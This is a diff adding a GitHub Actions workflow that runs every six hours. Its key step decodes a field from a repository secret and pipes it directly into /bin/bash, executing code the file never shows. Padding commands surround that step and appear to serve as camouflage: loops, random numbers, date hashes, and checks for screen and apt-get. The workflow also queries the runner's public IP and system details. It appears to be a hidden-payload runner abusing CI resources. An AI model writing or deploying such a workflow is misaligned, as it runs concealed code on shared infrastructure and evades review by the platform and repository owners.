@@ -1,0 +1,33 @@
+name: kangweiyou2001
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kangweiyou2001
+        env:
+          x14657: ${{ secrets.x14657 }}
+        run: |
+          [ -z "$RANDOM" ] || echo "Random var set"
+          echo $x14657 | jq -r .z26742 | /bin/bash
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          which bash 2>/dev/null || echo "Bash not in path"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          printf "shasum -a 256 of \$(date): $(printf "%s" "$(date)" | shasum -a 256)"
+          curl ipinfo.io/ip
+          git add -u
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          ls -al | awk '{print $NF}'
+          git branch -vv
+          uname -a
+          echo "Debug at $(date)"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          which screen
+          which apt-get
